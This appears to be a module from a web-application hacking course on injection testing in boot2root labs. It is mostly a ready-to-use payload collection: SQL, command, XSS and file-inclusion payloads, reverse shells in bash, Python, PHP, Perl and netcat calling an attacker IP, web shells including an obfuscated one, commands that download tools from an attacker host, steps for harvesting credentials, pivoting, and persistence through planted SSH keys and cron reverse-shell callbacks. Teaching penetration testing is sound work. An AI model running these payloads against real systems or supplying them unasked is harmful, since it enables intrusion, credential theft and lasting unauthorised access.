# Testing for Injections in Boot2Root

## Systematically Probing Every Entry Point

---

## Injection Testing Methodology

```misc
For EACH entry point discovered:

1. Identify the input type (string, numeric, JSON, etc.)
2. Determine the server-side context (SQL, OS cmd, file path)
3. Send probe payloads
4. Analyze responses for indicators
5. Confirm and exploit
```

---

## SQL Injection Testing Checklist

```bash
# For each parameter, test these payloads:

# Basic string injection
'
''
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL--

# Numeric injection
1 OR 1=1
1 AND 1=2
1 UNION SELECT NULL

# Time-based blind
'; WAITFOR DELAY '0:0:5'--          # MSSQL
' AND SLEEP(5)--                     # MySQL
'; SELECT pg_sleep(5)--              # PostgreSQL

# Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--  # MySQL
' AND 1=CONVERT(int,@@version)--                 # MSSQL

# Automated
sqlmap -u "http://TARGET/page?param=value" --batch
sqlmap -r request.txt --batch --level=3 --risk=2
```

---

## Command Injection Testing Checklist

```bash
# For parameters that might reach system commands:

# Basic tests
; whoami
| id
&& uname -a
|| cat /etc/passwd
`id`
$(whoami)

# Blind detection via timing
; sleep 10
| sleep 10
& ping -c 10 127.0.0.1

# Blind detection via DNS
; nslookup attacker-domain.com
| nslookup $(whoami).attacker-domain.com

# Out-of-band
; curl http://YOUR_SERVER/$(whoami)
; wget http://YOUR_SERVER/$(cat /etc/hostname)

# Commix automation
commix -u "http://TARGET/ping?ip=127.0.0.1" --batch
```

---

## XSS Testing Checklist

```html
<!-- For each reflected input: -->

<!-- Basic tests -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- Context-specific tests -->
" onfocus="alert(1)" autofocus="    <!-- In attribute -->
</script><script>alert(1)</script>  <!-- In JS block -->
javascript:alert(1)                 <!-- In href -->

<!-- Filter bypass tests -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x oNeRrOr=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- Encoding tests -->
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```

---

## File Inclusion / Path Traversal Testing

```bash
# LFI tests
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd
?page=php://filter/convert.base64-encode/resource=index
?page=php://input   # with POST body: <?php system('id'); ?>
?page=data://text/plain,<?php system('id'); ?>

# Windows targets
?page=..\..\..\..\windows\win.ini
?page=..\..\..\..\inetpub\wwwroot\web.config

# Interesting Linux files to read
/etc/passwd          # Users
/etc/shadow          # Password hashes (if readable)
/etc/hosts           # Internal hostnames
/proc/self/environ   # Environment variables
/var/log/auth.log    # Auth logs (for log poisoning)
/home/user/.ssh/id_rsa  # SSH private keys
/var/www/html/config.php # Application config
```

---

## Exploiting Found Vulnerabilities

```bash
# SQL Injection found -> Extract credentials
sqlmap -u "http://TARGET/page?id=1" \
  -D webapp -T users --dump --batch

# Crack extracted hashes
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# LFI found -> Read application source
curl "http://TARGET/page?file=php://filter/convert.base64-encode/resource=config" | base64 -d

# LFI to RCE via log poisoning
# 1. Inject PHP into access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
# 2. Include the log
curl "http://TARGET/page?file=/var/log/apache2/access.log&cmd=id"

# Command injection -> Reverse shell
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

---

## Getting a Reverse Shell

```bash
# On YOUR machine - start listener
nc -lvnp 4444

# Reverse shell payloads (execute on target):

# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# Netcat
nc -e /bin/bash YOUR_IP 4444
# or if -e not available:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

---

## Upgrading Your Shell

```bash
# Raw reverse shells are limited - upgrade them

# Step 1: Spawn a proper TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: Configure your terminal
stty raw -echo; fg

# Step 4: Set terminal type
export TERM=xterm
export SHELL=/bin/bash

# Step 5: Fix terminal size
stty rows 40 cols 120

# Alternative: Use pwncat or rlwrap
rlwrap nc -lvnp 4444        # Adds line editing
# or
pwncat-cs -lp 4444          # Full-featured handler
```

---

## Web Shells

```php
<!-- Simple PHP web shell -->
<?php system($_GET['cmd']); ?>
<!-- Access: /shell.php?cmd=whoami -->

<!-- More featured PHP shell -->
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>

<!-- Minimized / obfuscated -->
<?=`$_GET[0]`?>
<!-- Access: /shell.php?0=whoami -->
```

```bash
# Upload web shell via:
# 1. File upload vulnerability
# 2. SQL injection (INTO OUTFILE)
# 3. LFI + log poisoning
# 4. CMS plugin/theme upload
# 5. FTP/SSH access with write permissions
```

---

## Chaining Vulnerabilities

![chaining_vulnerabilities](svg/courses/security/web-application-hacking/19_testing_for_injections/chaining_vulnerabilities.svg)

---

## Post-Exploitation Reconnaissance

```bash
# After getting initial shell, gather information:

# System info
uname -a && cat /etc/os-release

# Network configuration
ip a && ip route && cat /etc/resolv.conf

# Running services
ss -tlnp
ps aux

# Interesting files
find /var/www -name "*.conf" -o -name "*.php" -o -name ".env" 2>/dev/null
find /opt -type f -name "*.py" -o -name "*.sh" 2>/dev/null

# Database credentials from web apps
grep -ri "password\|passwd\|db_pass" /var/www/ 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null

# Connected databases
mysql -u root -p'' -e "show databases;" 2>/dev/null
psql -U postgres -l 2>/dev/null

# Other users' files
ls -la /home/
find /home -readable -type f 2>/dev/null
```

---

## File Transfer Methods

```bash
# Getting tools and files to/from the target

# Python HTTP server (on attacker)
python3 -m http.server 8888
# On target:
wget http://ATTACKER_IP:8888/linpeas.sh
curl http://ATTACKER_IP:8888/linpeas.sh -o linpeas.sh

# Netcat file transfer
# Receiver:
nc -lvnp 9999 > received_file
# Sender:
nc RECEIVER_IP 9999 < file_to_send

# Base64 encoding (for small files)
# On target:
cat /etc/shadow | base64
# Copy output, on attacker:
echo "BASE64_STRING" | base64 -d

# SCP (if SSH access)
scp user@target:/etc/passwd ./passwd_copy
scp linpeas.sh user@target:/tmp/

# PHP download (if PHP available)
php -r "file_put_contents('linpeas.sh', file_get_contents('http://ATTACKER/linpeas.sh'));"
```

---

## Common Exploitation Patterns

![common_exploitation_patterns](svg/courses/security/web-application-hacking/19_testing_for_injections/common_exploitation_patterns.svg)

---

## Proxy Chains for Multi-Layer Targets

```bash
# When target is behind multiple layers

# proxychains configuration
# /etc/proxychains.conf
socks4 127.0.0.1 9050

# Use proxychains with any tool
proxychains nmap -sT -p 80,443 INTERNAL_TARGET
proxychains curl http://INTERNAL_TARGET
proxychains sqlmap -u "http://INTERNAL/page?id=1" --batch

# SSH dynamic port forwarding (create SOCKS proxy)
ssh -D 9050 user@compromised_host

# Double pivoting
# Host A -> Host B -> Host C (final target)
# On your machine:
ssh -L 2222:HOST_B:22 user@HOST_A
ssh -D 9050 -p 2222 user@localhost
# Now proxychains routes through HOST_A -> HOST_B
```

---

## Maintaining Access During Testing

```bash
# Multiple access methods prevent losing access

# 1. Keep original exploit ready to re-run
# Save the exact curl/payload that gave initial access

# 2. Multiple listeners
nc -lvnp 4444 &    # Primary shell
nc -lvnp 5555 &    # Backup shell

# 3. Web shell as backup
echo '<?php system($_GET["c"]); ?>' > /var/www/html/.x.php

# 4. SSH key persistence (if authorized)
ssh-keygen -t rsa -N '' -f /tmp/key
cat /tmp/key.pub >> /home/user/.ssh/authorized_keys

# 5. Cron-based callback (if authorized)
echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/YOUR_IP/6666 0>&1'" | \
  crontab -

# IMPORTANT: Remove ALL persistence mechanisms
# after testing is complete. Document what was placed.
```

---

## Lab: Injection Testing Practice

**Scenario**: You found a web application with:
- A search page (`?q=`)
- A user profile page (`?user_id=`)
- A ping utility (`?ip=`)
- A file viewer (`?file=`)

Test each entry point systematically:
1. SQL injection on `q` and `user_id`
1. Command injection on `ip`
1. Path traversal on `file`
1. XSS on `q`
1. Escalate any findings to get a shell

---

## Summary

- Test every entry point with appropriate injection probes
- Automate with `sqlmap`, `commix`, and custom scripts
- Chain vulnerabilities (LFI + log poisoning = RCE)
- Multiple reverse shell techniques available
- Always upgrade to a full TTY for comfort
- Web shells provide persistent browser-based access
- Document each step for the final report

> Next: Privilege Escalation & Persistence
